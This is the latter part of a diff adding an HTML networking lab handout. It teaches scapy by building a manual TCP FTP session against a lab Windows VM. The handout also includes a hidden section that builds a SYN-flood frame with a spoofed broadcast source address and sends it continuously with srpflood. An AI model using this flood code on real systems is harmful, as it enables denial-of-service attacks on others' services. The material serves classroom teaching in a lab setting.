+    <span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">return</span><span class="S0"> </span>r<br />
+    <span class="S1">#--------</span><br />
+        </li></ul>
+    </li><li>
+        Try out the functions:
+        <ul class="pycode"><li>
+            replylist = probe(serverIP, 21)&nbsp;&nbsp;<span class="smaller fancyfont green"># "serverIP" contains the <span class="fake red">Windows-IP</span> value. Port 21 is FTP.</span>
+        </li><li>
+            for reply in replylist:&nbsp;&nbsp;&nbsp;&nbsp;<span class="smaller fancyfont green"># each packet in the list</span>
+            <br />&nbsp;&nbsp;&nbsp;&nbsp;reply.summary()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="smaller fancyfont green"># the entire frame</span>
+            <br />&nbsp;&nbsp;&nbsp;&nbsp;reply[Raw].show()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="smaller fancyfont green"># the payload portion</span>
+        </li></ul>
+    </li></ul>
+    <p class="inum">
+    What did you find in the payload portions of the replies?
+    </p>
+
+</li></ol>
+
+<!-- ============================================================= -->
+<h2>FTP session over TCP</h2>
+
+<ol><li class=""> <!-- ======== -->
+    Finally, this function uses the <tt>handshake()</tt> function and performs an entire minimal FTP session:
+    <ul class="pycode"><li>
+<span class="S5">def</span><span class="S0"> </span><span class="S9">ftpsession</span><span class="S10">(</span>dip<span class="S10">,</span><span class="S0"> </span>dport<span class="S10">=</span><span class="S2">21</span><span class="S10">,</span><span class="S0"> </span>sport<span class="S10">=</span><span class="S2">54321</span><span class="S10">):</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>msgs<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span><span class="S10">[</span><span class="S0"> \</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S4">b'USER anonymous\r\n'</span><span class="S10">,</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S4">b'PASS virt@example.org\r\n'</span><span class="S10">,</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S4">b'SYST\r\n'</span><span class="S10">,</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S4">b'QUIT\r\n'</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S10">]</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>replies<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span><span class="S10">[</span><span class="S0"> </span><span class="S10">]</span><br />
+<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>response<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>handshake<span class="S10">(</span>dip<span class="S10">,</span><span class="S0"> </span>dport<span class="S10">,</span><span class="S0"> </span>sport<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">if</span><span class="S0"> </span><span class="S5">not</span><span class="S0"> </span>response<span class="S10">:</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">return</span><span class="S0"> </span>None<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>r<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>sniff<span class="S10">(</span>count<span class="S10">=</span><span class="S2">1</span><span class="S10">,</span><span class="S0"> </span>prn<span class="S10">=</span>ack<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>rsp<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>r<span class="S10">[</span><span class="S2">0</span><span class="S10">]</span><span class="S0"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S1"># each response includes needed connection information</span><br />
+<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ip<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>IP<span class="S10">(</span>dst<span class="S10">=</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>src<span class="S10">,</span><span class="S0"> </span>src<span class="S10">=</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>dst<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>dport<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>sport<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>sport<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>dport<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">for</span><span class="S0"> </span>m<span class="S0"> </span><span class="S5">in</span><span class="S0"> </span>msgs<span class="S10">:</span><span class="S0"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S1"># send out each message, and collect its response</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>seqval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>ack<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>payloadlength<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>IP<span class="S10">].</span>len<span class="S0"> </span><span class="S10">-</span><span class="S0"> </span><span class="S2">4</span><span class="S10">*(</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>ihl<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>dataofs<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>ackval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>seq<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span>payloadlength<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span><span class="S2">1</span><span class="S0"> &nbsp;&nbsp;</span><span class="S1"># adding 1 needed?</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>tcp<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>TCP<span class="S10">(</span>dport<span class="S10">=</span>dport<span class="S10">,</span><span class="S0"> </span>sport<span class="S10">=</span>sport<span class="S10">,</span><span class="S0"> </span>seq<span class="S10">=</span>seqval<span class="S10">,</span><span class="S0"> </span>ack<span class="S10">=</span>ackval<span class="S10">,</span><span class="S0"> </span>flags<span class="S10">=</span><span class="S4">'PA'</span><span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>tcp<span class="S10">.</span>payload<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>m<br />
+<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>rsp<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>sr1<span class="S10">(</span>ip<span class="S10">/</span>tcp<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>ack<span class="S10">(</span>rsp<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>replies<span class="S10">.</span>append<span class="S10">(</span><span class="S0"> </span>rsp<span class="S0"> </span><span class="S10">)</span><span class="S0"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S1"># build a list of responses for later processing</span><br />
+<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S1"># end the connection;</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>seqval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>ack<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>payloadlength<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>IP<span class="S10">].</span>len<span class="S0"> </span><span class="S10">-</span><span class="S0"> </span><span class="S2">4</span><span class="S10">*(</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>ihl<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>dataofs<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ackval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>seq<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span>payloadlength<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span><span class="S2">1</span><span class="S0"> &nbsp;&nbsp;</span><span class="S1"># adding 1 needed?</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>finack<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>TCP<span class="S10">(</span>dport<span class="S10">=</span>dport<span class="S10">,</span><span class="S0"> </span>sport<span class="S10">=</span>sport<span class="S10">,</span><span class="S0"> </span>seq<span class="S10">=</span>seqval<span class="S10">,</span><span class="S0"> </span>ack<span class="S10">=</span>ackval<span class="S10">,</span><span class="S0"> </span>flags<span class="S10">=</span><span class="S4">'FA'</span><span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>send<span class="S10">(</span>ip<span class="S10">/</span>finack<span class="S10">)</span><br />
+<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">return</span><span class="S0"> </span>replies<br />
+<span class="S1">#--------</span></span>
+    </li></ul>
+
+</li><li>
+    Try out the <tt>ftpsession()</tt> function:
+    <ul class="pycode"><li>
+        replylist = ftpsession(serverIP)&nbsp;&nbsp;<span class="smaller fancyfont green"># "serverIP": <span class="fake red">Windows-IP</span> value</span>
+
+    </li><li>
+        for reply in replylist:&nbsp;&nbsp;&nbsp;&nbsp;<span class="smaller fancyfont green"># each packet in the list</span>
+        <br />&nbsp;&nbsp;&nbsp;&nbsp;reply.summary()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="smaller fancyfont green"># the entire frame</span>
+        <br />&nbsp;&nbsp;&nbsp;&nbsp;reply[Raw].show()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="smaller fancyfont green"># the payload portion</span>
+    </li></ul>
+    <p class="inum">
+    Look at the server's replies.
+    What operating system is reported (in response to the "SYST" message)?
+    </p>
+    <p class="inum">
+    Look in the wireshark window.
+    Did you receive any packet retransmissions?
+    If so, which packets were retransmitted?
+    </p>
+
+</li><li>
+    Restore the Linux "iptables" firewall to its previous condition:
+    <ul class="pycode"><li>
+        os.system(fwRule % '-D')
+    </li></ul>
+
+</li></ol>
+
+<div id="SYNflood" class="HIDE">
+<!-- ============================================================= -->
+<h2>A Denial-Of-Service (DOS) attack</h2>
+One way to perform a DOS attack is to send a large number of packets to a victim that initiate TCP connections but never complete them.
+The victim devotes system resources to each initiated connection, until it runs out of resources and perhaps crashes.
+This is called a "SYN flood" because the packets that initiate a TCP connection are packets with their SYN bit set.
+This works best if many machines (a botnet) can be commanded to all send SYN packets to the victim at the same time.
+For good measure, the source address is spoofed (to protect the guilty).
+<p>
+For this to work, the victim must be prepared to accept TCP connections on one (or more) of its server ports.
+Defenses against this include blocking all unused ports with a firewall, limiting the number of connections that the computer will accept at one time, and limiting the amount of time that the computer will reserve resources for the initiated connection.
+</p>
+<p>
+For this exercise assume that the Windows VM is listening on port 445.
+The "zenmap" program that you used earlier showed you a list of listening ports; any of those is acceptable as well. 
+</p>
+<ol><li>
+    Enter these commands to build an attack frame:
+    <ul class="pycode"><li>
+        goatIP = '192.168.<span class="fake red">x</span>.63'  <span class="smaller fancyfont Remark"># broadcast IP address as source!</span>
+    </li><li>
+        goatMAC = 'ff:ff:ff:ff:ff:ff'  <span class="smaller fancyfont Remark"># broadcast MAC address</span>
+    </li><li>
+        victim = '<span class="fake red">Windows-IP</span>'  <span class="smaller fancyfont Remark"># specify your Windows VM for dst</span>
+    </li><li>
+        victimport = 445        <span class="smaller fancyfont Remark"># SMB protocol usually runs on Windows</span>
+    </li><li>
+        tcp = TCP(dport=victimport)
+    </li><li>
+        tcp.show()      <span class="smaller fancyfont Remark"># flags should be set to S</span>
+    </li><li>
+        ip = IP(src=goatIP, dst=victim)
+    </li><li>
+        pad&nbsp;=&nbsp;Padding()
+    </li><li>
+        pad.load = '\x00' * (46 - len(ip/tcp))      <span class="smaller fancyfont Remark"># 46 == minimum Ethernet payload?</span>
+    </li><li>
+        eth = Ether(src=goatMAC)
+    </li><li class="">
+        synframe = eth/ip/tcp/pad
+    </li><li>
+        print(len(synframe))          <span class="smaller fancyfont Remark"># should equal 60</span>
+    </li><li>
+        synframe.show()
+    </li></ul>
+
+</li><li>
+    Put this display filter into Wireshark:
+<br /><span class="filter">
+ip.addr==<span class="fake red">Windows-IP</span>&nbsp;&amp;&amp;&nbsp;(tcp.flags.syn==1&nbsp;||&nbsp;tcp.flags.ack==1)
+</span><br />
+    Stop it if it's already capturing packets, then restart it to get a fresh capture.
+    Then send out the frame and collect any responses.
+    <ul class="pycode"><li>
+        srp(synframe)
+    </li></ul>
+    Look at the wireshark window.
+    <p class="inum">
+    How many total packets does wireshark show?
+    <br/>
+    What kind(s) of packet, is returned?
+    <br/>
+    What is the apparent destination for the returned packets?
+    </p>
+</li><li>
+
+</li><li>
+    Send out a continual stream of frames, as fast as possible:
+    <ul class="pycode"><li>
+        srpflood(synframe)
+    </li></ul>
+    After a few seconds, press <strong class="tt">&lt;Ctrl&gt;-C</strong> to stop the flood.
+    <p class="">
+    Wireshark's default timestamp column (in the upper pane) counts seconds and fractions of seconds.
+    The leftmost column counts the packets.
+    </p>
+    <p class="inum">
+    How many total packets does wireshark show?
+    <br/>
+    How many packets per second did scapy send out?
+    </p>
+
+</li></ol>
+</div><!-- SYNflood -->
+
+<h2>shut down</h2>
+<p>
+Close down scapy by entering the <code>exit()</code> command.
+Also close the Wireshark window.
+You needn't save anything.
+Shut down your VMs.
+</p>
+
+</div><!-- content -->
+<script type="text/javascript">ts_validate();</script>
+</body></html>
